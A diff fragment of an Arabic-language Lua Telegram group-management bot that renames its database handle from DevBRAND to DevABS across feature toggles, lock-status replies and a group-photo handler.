 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تعطيل معاني الاسماء'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:set(BRAND..'BRAND:Mean:BRAND'..msg.chat_id_,true)  
+DevABS:set(BRAND..'BRAND:Mean:BRAND'..msg.chat_id_,true)  
 end
-if not DevBRAND:get(BRAND..'BRAND:Mean:BRAND'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Mean:BRAND'..msg.chat_id_) then
 if text and text:match("^معنى الاسم (.*)$") and SourceCh(msg) or text and text:match("^معنى اسم (.*)$") and SourceCh(msg) then 
 local TextMean = text:match("^معنى الاسم (.*)$") or text:match("^معنى اسم (.*)$") 
 UrlMean = https.request('https://apiDevprox.ml/Mean.php?BRAND='..URL.escape(TextMean)) 
@@ -8801,14 +8801,14 @@ end
 if text == "تفعيل غنيلي" and Manager(msg) and ChCheck(msg) then
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تفعيل غنيلي بنجاح'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:del(BRAND..'BRAND:Audios:BRAND'..msg.chat_id_) 
+DevABS:del(BRAND..'BRAND:Audios:BRAND'..msg.chat_id_) 
 end
 if text == "تعطيل غنيلي" and Manager(msg) and ChCheck(msg) then
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تعطيل غنيلي بنجاح'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:set(BRAND..'BRAND:Audios:BRAND'..msg.chat_id_,true)  
+DevABS:set(BRAND..'BRAND:Audios:BRAND'..msg.chat_id_,true)  
 end
-if text == "غنيلي" and not DevBRAND:get(BRAND..'BRAND:Audios:BRAND'..msg.chat_id_) and SourceCh(msg) then
+if text == "غنيلي" and not DevABS:get(BRAND..'BRAND:Audios:BRAND'..msg.chat_id_) and SourceCh(msg) then
 data,res = https.request('https://apiDevprox.ml/Audios.php')
 if res == 200 then
 Audios = json:decode(data)
@@ -8825,110 +8825,110 @@ end
 end
 --     Source BRAND     --
 if Admin(msg) then
-if DevBRAND:get(BRAND..'BRAND:LockSettings'..msg.chat_id_) then 
-if text == "الروابط" then if DevBRAND:get(BRAND..'BRAND:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end local BRANDTTEAM = "\n" .."⌁︙الروابط ↫ "..mute_links.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
-if text == "المعرف" or text == "المعرفات" then if DevBRAND:get(BRAND..'BRAND:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفوله' else lock_tag = 'مفتوحه' end local BRANDTTEAM = "\n" .."⌁︙المعرف ↫ "..lock_tag.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
-if text == "المتحركه" or text == "الملصقات المتحركه" then if DevBRAND:get(BRAND..'BRAND:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفوله' else mute_gifs = 'مفتوحه' end local BRANDTTEAM = "\n" .."⌁︙المتحركه ↫ "..mute_gifs.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
-if text == "الملصقات" then if DevBRAND:get(BRAND..'BRAND:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفوله' else lock_sticker = 'مفتوحه' end local BRANDTTEAM = "\n" .."⌁︙الملصقات ↫ "..lock_sticker.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
-if text == "الصور" then if DevBRAND:get(BRAND..'BRAND:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفوله' else mute_photo = 'مفتوحه' end local BRANDTTEAM = "\n" .."⌁︙الصور ↫ "..mute_photo.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
-if text == "الفيديو" or text == "الفيديوهات" then if DevBRAND:get(BRAND..'BRAND:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفوله' else mute_video = 'مفتوحه' end local BRANDTTEAM = "\n" .."⌁︙الفيديو ↫ "..mute_video.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
-if text == "الاونلاين" then if DevBRAND:get(BRAND..'BRAND:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفل' else mute_in = 'مفتوح' end local BRANDTTEAM = "\n" .."⌁︙الاونلاين ↫ "..mute_in.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
-if text == "الدردشه" then if DevBRAND:get(BRAND..'BRAND:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه' end local BRANDTTEAM = "\n" .."⌁︙الدردشه ↫ "..mute_text.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
-if text == "التوجيه" or text == "اعاده التوجيه" then if DevBRAND:get(BRAND..'BRAND:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفل' else lock_forward = 'مفتوح' end local BRANDTTEAM = "\n" .."⌁︙التوجيه ↫ "..lock_forward.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
-if text == "الاغاني" then if DevBRAND:get(BRAND..'BRAND:Lock:Music'..msg.chat_id_) then mute_music = 'مقفوله' else mute_music = 'مفتوحه' end local BRANDTTEAM = "\n" .."⌁︙الاغاني ↫ "..mute_music.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
-if text == "الصوت" or text == "الصوتيات" then if DevBRAND:get(BRAND..'BRAND:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفول' else mute_voice = 'مفتوح' end local BRANDTTEAM = "\n" .."⌁︙الصوت ↫ "..mute_voice.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
-if text == "الجهات" or text == "جهات الاتصال" then if DevBRAND:get(BRAND..'BRAND:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفوله' else lock_contact = 'مفتوحه' end local BRANDTTEAM = "\n" .."⌁︙الجهات ↫ "..lock_contact.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
-if text == "الماركداون" then if DevBRAND:get(BRAND..'BRAND:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفل' else markdown = 'مفتوح' end local BRANDTTEAM = "\n" .."⌁︙الماركداون ↫ "..markdown.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
-if text == "الهاشتاك" then if DevBRAND:get(BRAND..'BRAND:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفل' else lock_htag = 'مفتوح' end local BRANDTTEAM = "\n" .."⌁︙الهاشتاك ↫ "..lock_htag.."\n"Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
-if text == "التعديل" then if DevBRAND:get(BRAND..'BRAND:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفل' else mute_edit = 'مفتوح' end local BRANDTTEAM = "\n" .."⌁︙التعديل ↫ "..mute_edit.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
-if text == "التثبيت" then if DevBRAND:get(BRAND..'BRAND:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفل' else lock_pin = 'مفتوح' end local BRANDTTEAM = "\n" .."⌁︙التثبيت ↫ "..lock_pin.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
-if text == "الاشعارات" then if DevBRAND:get(BRAND..'BRAND:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفوله' else lock_tgservice = 'مفتوحه' end local BRANDTTEAM = "\n" .."⌁︙الاشعارات ↫ "..lock_tgservice.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
-if text == "الكلايش" then if DevBRAND:get(BRAND..'BRAND:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفوله' else lock_spam = 'مفتوحه' end local BRANDTTEAM = "\n" .."⌁︙الكلايش ↫ "..lock_spam.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
-if text == "الدخول" then if DevBRAND:get(BRAND..'BRAND:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفول' else lock_Join = 'مفتوح' end local BRANDTTEAM = "\n" .."⌁︙الدخول ↫ "..lock_Join.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
-if text == "الشبكات" then if DevBRAND:get(BRAND..'BRAND:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفوله' else lock_wp = 'مفتوحه' end local BRANDTTEAM = "\n" .."⌁︙الشبكات ↫ "..lock_wp.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
-if text == "المواقع" then if DevBRAND:get(BRAND..'BRAND:Lock:Location'..msg.chat_id_) then lock_location = 'مقفوله' else lock_location = 'مفتوحه' end local BRANDTTEAM = "\n" .."⌁︙المواقع ↫ "..lock_location.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
-if text == "العربيه" then if DevBRAND:get(BRAND..'BRAND:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفوله' else lock_arabic = 'مفتوحه' end local BRANDTTEAM = "\n" .."⌁︙العربيه ↫ "..lock_arabic.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
-if text == "الانكليزيه" then if DevBRAND:get(BRAND..'BRAND:Lock:English'..msg.chat_id_) then lock_english = 'مقفوله' else lock_english = 'مفتوحه' end local BRANDTTEAM = "\n" .."⌁︙الانكليزيه ↫ "..lock_english.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
-if text == "الكفر" then if DevBRAND:get(BRAND..'BRAND:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end local BRANDTTEAM = "\n" .."⌁︙الكفر ↫ "..lock_kaf.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
-if text == "الفشار" then if DevBRAND:get(BRAND..'BRAND:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end local BRANDTTEAM = "\n" .."⌁︙الفشار ↫ "..lock_fshar.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
-if text == "الطائفيه" then if DevBRAND:get(BRAND..'BRAND:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end local BRANDTTEAM = "\n" .."⌁︙الطائفيه ↫ "..lock_taf.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
+if DevABS:get(BRAND..'BRAND:LockSettings'..msg.chat_id_) then 
+if text == "الروابط" then if DevABS:get(BRAND..'BRAND:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end local BRANDTTEAM = "\n" .."⌁︙الروابط ↫ "..mute_links.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
+if text == "المعرف" or text == "المعرفات" then if DevABS:get(BRAND..'BRAND:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفوله' else lock_tag = 'مفتوحه' end local BRANDTTEAM = "\n" .."⌁︙المعرف ↫ "..lock_tag.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
+if text == "المتحركه" or text == "الملصقات المتحركه" then if DevABS:get(BRAND..'BRAND:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفوله' else mute_gifs = 'مفتوحه' end local BRANDTTEAM = "\n" .."⌁︙المتحركه ↫ "..mute_gifs.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
+if text == "الملصقات" then if DevABS:get(BRAND..'BRAND:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفوله' else lock_sticker = 'مفتوحه' end local BRANDTTEAM = "\n" .."⌁︙الملصقات ↫ "..lock_sticker.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
+if text == "الصور" then if DevABS:get(BRAND..'BRAND:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفوله' else mute_photo = 'مفتوحه' end local BRANDTTEAM = "\n" .."⌁︙الصور ↫ "..mute_photo.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
+if text == "الفيديو" or text == "الفيديوهات" then if DevABS:get(BRAND..'BRAND:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفوله' else mute_video = 'مفتوحه' end local BRANDTTEAM = "\n" .."⌁︙الفيديو ↫ "..mute_video.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
+if text == "الاونلاين" then if DevABS:get(BRAND..'BRAND:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفل' else mute_in = 'مفتوح' end local BRANDTTEAM = "\n" .."⌁︙الاونلاين ↫ "..mute_in.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
+if text == "الدردشه" then if DevABS:get(BRAND..'BRAND:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه' end local BRANDTTEAM = "\n" .."⌁︙الدردشه ↫ "..mute_text.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
+if text == "التوجيه" or text == "اعاده التوجيه" then if DevABS:get(BRAND..'BRAND:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفل' else lock_forward = 'مفتوح' end local BRANDTTEAM = "\n" .."⌁︙التوجيه ↫ "..lock_forward.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
+if text == "الاغاني" then if DevABS:get(BRAND..'BRAND:Lock:Music'..msg.chat_id_) then mute_music = 'مقفوله' else mute_music = 'مفتوحه' end local BRANDTTEAM = "\n" .."⌁︙الاغاني ↫ "..mute_music.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
+if text == "الصوت" or text == "الصوتيات" then if DevABS:get(BRAND..'BRAND:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفول' else mute_voice = 'مفتوح' end local BRANDTTEAM = "\n" .."⌁︙الصوت ↫ "..mute_voice.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
+if text == "الجهات" or text == "جهات الاتصال" then if DevABS:get(BRAND..'BRAND:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفوله' else lock_contact = 'مفتوحه' end local BRANDTTEAM = "\n" .."⌁︙الجهات ↫ "..lock_contact.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
+if text == "الماركداون" then if DevABS:get(BRAND..'BRAND:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفل' else markdown = 'مفتوح' end local BRANDTTEAM = "\n" .."⌁︙الماركداون ↫ "..markdown.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
+if text == "الهاشتاك" then if DevABS:get(BRAND..'BRAND:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفل' else lock_htag = 'مفتوح' end local BRANDTTEAM = "\n" .."⌁︙الهاشتاك ↫ "..lock_htag.."\n"Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
+if text == "التعديل" then if DevABS:get(BRAND..'BRAND:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفل' else mute_edit = 'مفتوح' end local BRANDTTEAM = "\n" .."⌁︙التعديل ↫ "..mute_edit.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
+if text == "التثبيت" then if DevABS:get(BRAND..'BRAND:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفل' else lock_pin = 'مفتوح' end local BRANDTTEAM = "\n" .."⌁︙التثبيت ↫ "..lock_pin.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
+if text == "الاشعارات" then if DevABS:get(BRAND..'BRAND:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفوله' else lock_tgservice = 'مفتوحه' end local BRANDTTEAM = "\n" .."⌁︙الاشعارات ↫ "..lock_tgservice.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
+if text == "الكلايش" then if DevABS:get(BRAND..'BRAND:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفوله' else lock_spam = 'مفتوحه' end local BRANDTTEAM = "\n" .."⌁︙الكلايش ↫ "..lock_spam.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
+if text == "الدخول" then if DevABS:get(BRAND..'BRAND:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفول' else lock_Join = 'مفتوح' end local BRANDTTEAM = "\n" .."⌁︙الدخول ↫ "..lock_Join.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
+if text == "الشبكات" then if DevABS:get(BRAND..'BRAND:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفوله' else lock_wp = 'مفتوحه' end local BRANDTTEAM = "\n" .."⌁︙الشبكات ↫ "..lock_wp.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
+if text == "المواقع" then if DevABS:get(BRAND..'BRAND:Lock:Location'..msg.chat_id_) then lock_location = 'مقفوله' else lock_location = 'مفتوحه' end local BRANDTTEAM = "\n" .."⌁︙المواقع ↫ "..lock_location.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
+if text == "العربيه" then if DevABS:get(BRAND..'BRAND:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفوله' else lock_arabic = 'مفتوحه' end local BRANDTTEAM = "\n" .."⌁︙العربيه ↫ "..lock_arabic.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
+if text == "الانكليزيه" then if DevABS:get(BRAND..'BRAND:Lock:English'..msg.chat_id_) then lock_english = 'مقفوله' else lock_english = 'مفتوحه' end local BRANDTTEAM = "\n" .."⌁︙الانكليزيه ↫ "..lock_english.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
+if text == "الكفر" then if DevABS:get(BRAND..'BRAND:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end local BRANDTTEAM = "\n" .."⌁︙الكفر ↫ "..lock_kaf.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
+if text == "الفشار" then if DevABS:get(BRAND..'BRAND:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end local BRANDTTEAM = "\n" .."⌁︙الفشار ↫ "..lock_fshar.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
+if text == "الطائفيه" then if DevABS:get(BRAND..'BRAND:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end local BRANDTTEAM = "\n" .."⌁︙الطائفيه ↫ "..lock_taf.."\n" Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM, 1, 'md') end
 end
 --     Source BRAND     --
 if text == 'تفعيل كشف الاعدادات' and ChCheck(msg) then 
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تفعيل كشف الاعدادات'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:set(BRAND..'BRAND:LockSettings'..msg.chat_id_,true)  
+DevABS:set(BRAND..'BRAND:LockSettings'..msg.chat_id_,true)  
 end
 if text == 'تعطيل كشف الاعدادات' and ChCheck(msg) then 
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تعطيل كشف الاعدادات'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:del(BRAND..'BRAND:LockSettings'..msg.chat_id_) 
+DevABS:del(BRAND..'BRAND:LockSettings'..msg.chat_id_) 
 end
 --     Source BRAND     --
 if text == 'تفعيل اوامر التحشيش' and Manager(msg) and ChCheck(msg) then 
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تفعيل اوامر التحشيش'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:del(BRAND..'BRAND:Lock:Stupid'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:Stupid'..msg.chat_id_)
 end
 if text == 'تعطيل اوامر التحشيش' and Manager(msg) and ChCheck(msg) then 
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تعطيل اوامر التحشيش'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:set(BRAND..'BRAND:Lock:Stupid'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:Stupid'..msg.chat_id_,true)
 end
 --     Source BRAND     --
 if text and (text == 'تعطيل التحقق' or text == 'قفل التحقق' or text == 'تعطيل تنبيه الدخول') and Manager(msg) and ChCheck(msg) then 
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تعطيل التحقق بنجاح'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:del(BRAND..'BRAND:Lock:Robot'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:Robot'..msg.chat_id_)
 end
 if text and (text == 'تفعيل التحقق' or text == 'فتح التحقق' or text == 'تفعيل تنبيه الدخول') and Manager(msg) and ChCheck(msg) then 
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تفعيل التحقق بنجاح'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:set(BRAND..'BRAND:Lock:Robot'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:Robot'..msg.chat_id_,true)
 end
 --     Source BRAND     --
 if text == 'تفعيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تفعيل ردود المدير'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:del(BRAND..'BRAND:Lock:GpRed'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:GpRed'..msg.chat_id_)
 end
 if text == 'تعطيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تعطيل ردود المدير'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:set(BRAND..'BRAND:Lock:GpRed'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:GpRed'..msg.chat_id_,true)
 end
 --     Source BRAND     --
 if text == 'تفعيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تفعيل ردود المطور'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:del(BRAND..'BRAND:Lock:AllRed'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:AllRed'..msg.chat_id_)
 end
 if text == 'تعطيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تعطيل ردود المطور'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:set(BRAND..'BRAND:Lock:AllRed'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:AllRed'..msg.chat_id_,true)
 end
 --     Source BRAND     --
 if SecondSudo(msg) then
 if text == 'تفعيل المغادره' or text == '↫ تفعيل المغادره ⌁' then 
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تفعيل المغادره بنجاح'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:del(BRAND.."BRAND:Left:Bot"..BRAND)
+DevABS:del(BRAND.."BRAND:Left:Bot"..BRAND)
 end
 if text == 'تعطيل المغادره' or text == '↫ تعطيل المغادره ⌁' then 
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تعطيل المغادره بنجاح'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:set(BRAND.."BRAND:Left:Bot"..BRAND,true) 
+DevABS:set(BRAND.."BRAND:Left:Bot"..BRAND,true) 
 end 
 if text == 'تفعيل الاذاعه' or text == '↫ تفعيل الاذاعه ⌁' then 
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تفعيل الاذاعه بنجاح'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:del(BRAND.."BRAND:Send:Bot"..BRAND)
+DevABS:del(BRAND.."BRAND:Send:Bot"..BRAND)
 end
 if text == 'تعطيل الاذاعه' or text == '↫ تعطيل الاذاعه ⌁' then 
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تعطيل الاذاعه بنجاح'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:set(BRAND.."BRAND:Send:Bot"..BRAND,true) 
+DevABS:set(BRAND.."BRAND:Send:Bot"..BRAND,true) 
 end
 end
 --     Source BRAND     --
@@ -8949,7 +8949,7 @@ end,nil)
 end
 --     Source BRAND     --
 if msg.content_.photo_ then
-if DevBRAND:get(BRAND..'BRAND:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_) then
+if DevABS:get(BRAND..'BRAND:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_) then
 if msg.content_.photo_.sizes_[3] then
 photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_
 else
@@ -8958,22 +8958,22 @@ end
 tdcli_function ({ID = "ChangeChatPhoto",chat_id_ = msg.chat_id_,photo_ = getInputFile(photo_id) }, function(arg,data)   
 if data.code_ == 3 then
 send(msg.chat_id_, msg.id_,"⌁︙عذرا البوت ليس ادمن يرجى ترقيتي والمحاوله لاحقا") 
-DevBRAND:del(BRAND..'BRAND:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
+DevABS:del(BRAND..'BRAND:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
 return false  end
 if data.message_ == "CHAT_ADMIN_REQUIRED" then 
 send(msg.chat_id_, msg.id_,"⌁︙ليست لدي صلاحية تغير معلومات المجموعه يرجى التحقق من الصلاحيات") 
-DevBRAND:del(BRAND..'BRAND:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
+DevABS:del(BRAND..'BRAND:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
 else
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تغير صورة المجموعه'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
 end
 end,nil) 
-DevBRAND:del(BRAND..'BRAND:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
+DevABS:del(BRAND..'BRAND:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
 end 
 end
